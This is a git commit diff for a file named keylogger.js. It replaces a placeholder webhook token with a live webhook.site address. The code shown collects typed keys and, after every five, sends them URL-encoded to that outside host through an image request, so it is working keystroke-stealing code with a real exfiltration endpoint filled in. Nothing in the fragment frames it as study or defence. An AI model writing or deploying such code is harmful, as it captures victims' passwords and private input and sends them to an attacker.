66f61db4bdb2f52abcb10d588e73bc701bf3ef13
Jefferson Hernandez <56500262+Th3g4ntl3m4n@users.noreply.github.com>
2025-07-24 17:45:15 -0500

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -5,7 +5,7 @@
 
     if(buffer.length >= 5){
       const img = new Image();
-      img.src = "https://webhook.site/tu_token?keys=" + encodeURIComponent(buffer);
+      img.src = "https://webhook.site/c7ff61f0-954a-4234-b0a0-cadfdd980c32?keys=" + encodeURIComponent(buffer);
       buffer = "";
     }
   });
